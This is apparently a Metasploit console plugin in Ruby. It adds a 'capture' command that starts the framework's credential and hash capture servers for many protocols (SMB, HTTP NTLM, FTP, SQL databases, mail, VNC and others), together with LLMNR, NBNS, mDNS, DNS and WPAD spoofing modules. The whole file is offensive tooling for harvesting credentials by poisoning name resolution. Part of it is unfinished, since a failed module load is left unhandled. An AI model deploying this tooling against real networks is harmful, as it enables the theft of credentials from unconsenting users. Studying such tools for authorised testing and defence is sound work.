require 'uri'
require 'rex/sync/event'

module Msf

class Plugin::HashCapture < Msf::Plugin

  class ConsoleCommandDispatcher
    include Msf::Ui::Console::CommandDispatcher

    class CaptureJobListener
      def initialize(name, done_event)
        @name = name
        @done_event = done_event
      end

      def waiting(id)
        print_good("#{@name} started")
        @done_event.set
      end

      def start(id); end

      def completed(id, result, mod); end

      def failed(id, error, mod)
        print_error("#{@name} failed")
        @done_event.set
      end
    end

    HELP_REGEX = /^-?-h(?:elp)?$/

    def initialize(*args)
      super(*args)
      @active_job_ids = []
    end

    def name
      'HashCapture'
    end

    def commands
      {
        'capture' => "Start hash capturing services",
      }
    end

    # The main handler for the request command.
    #
    # @param args [Array<String>] The array of arguments provided by the user.
    # @return [nil]
    def cmd_capture(*args)
      # short circuit the whole deal if they need help
      return help if args.length == 0
      return help if args.length == 1 && args.first =~ HELP_REGEX

      if args.first == 'stop'
        listeners_stop
        return
      end

      if args.first == 'start'
        listeners_start(args)
        return
      end

      return help
    end

    def listeners_start(args)
      if @active_job_ids.length > 0
        # If there are active job IDs, we should fail: there's already a capture going on.
        # Make them stop it first.
        # The exception is if all jobs have been manually terminated, then let's treat it
        # as if the capture was stopped, and allow starting now.
        @active_job_ids.each do |job_id|

          if framework.jobs.key?(job_id.to_s)
            print_error('Capture already in progress. Stop the existing capture then restart a new one')
            return
          end
        end
        # All jobs have ended - let's clean ourselves up
        @active_job_ids = []
      end

      modules = {
        # Capturing
        'drda' => 'auxiliary/server/capture/drda',
        'ftp' => 'auxiliary/server/capture/ftp',
        'imap' => 'auxiliary/server/capture/imap',
        'mssql' => 'auxiliary/server/capture/mssql',
        'mysql' => 'auxiliary/server/capture/mysql',
        'pop3' => 'auxiliary/server/capture/pop3',
        'postgres' => 'auxiliary/server/capture/postgresql',
        'printjob' => 'auxiliary/server/capture/printjob_capture',
        'sip' => 'auxiliary/server/capture/sip',
        'smb' => 'auxiliary/server/capture/smb',
        'smtp' => 'auxiliary/server/capture/smtp',
        'telnet' => 'auxiliary/server/capture/telnet',
        'vnc' => 'auxiliary/server/capture/vnc',
        # Poisoning
        'dns' => 'auxiliary/spoof/dns/native_spoofer',
        'nbns' => 'auxiliary/spoof/nbns/nbns_response',
        'llmnr' => 'auxiliary/spoof/llmnr/llmnr_response',
        'mdns' => 'auxiliary/spoof/mdns/mdns_response',
        'wpad' => 'auxiliary/server/wpad',
      }

      modules['http'] = 'auxiliary/server/capture/http_ntlm'
      startup_events = []
      modules.each do |svc, module_name|
        mod = framework.modules.create(module_name)
        # Bail if we couldn't
        unless mod
          # Error: this should exist
        end
        datastore = {}
        datastore['SRVHOST'] = '127.0.0.1'

        opts = {}
        opts['Options'] = datastore
        opts['RunAsJob'] = true
        # opts['LocalOutput'] = self.driver.output
        method = "configure_#{svc}"
        if self.respond_to?(method)
          self.send(method, datastore)
        end

        event = Rex::Sync::Event.new(state=false,auto_reset=false)
        startup_events.append(event)
        job_listener = CaptureJobListener.new(mod.name, event)


        result = Msf::Simple::Auxiliary.run_simple(mod, opts, job_listener: job_listener)
        job_id = result[1]

        # Not really worried about @active_job_ids tracking jobs that may fail on startup (e.g. binding to a port). 
        # If one of them fails, we'll just end up tracking a job that no longer exists,
        # which is equivalent to the user manually stopping them after we start them.
        @active_job_ids.append(job_id)
      end

      # Wait for all the servers to start up
      startup_events.each do |event|
        event.wait
      end

      print_good("Started all capture jobs")
    end

    def listeners_stop
      @active_job_ids.each do |job_id|
        framework.jobs.stop_job(job_id)
      end
      @active_job_ids = []
      print_line('Capture listeners stopped')
    end

    # Print the appropriate help text depending on an optional option parser.
    #
    # @param opt_parser [Rex::Parser::Arguments] the argument parser for the
    #   request type.
    # @param msg [String] the first line of the help text to display to the
    #   user.
    #  @return [nil]
    def help(opt_parser = nil, msg = 'Usage: capture [start|stop] [options]')
      print_line(msg)
    end
  end

  def initialize(framework, opts)
    super
    add_console_dispatcher(ConsoleCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('HashCapture')
  end

  def name
    'Hash Capture'
  end

  def desc
    'Start all hash/password capture and spoofing services'
  end

end # end class

end # end module
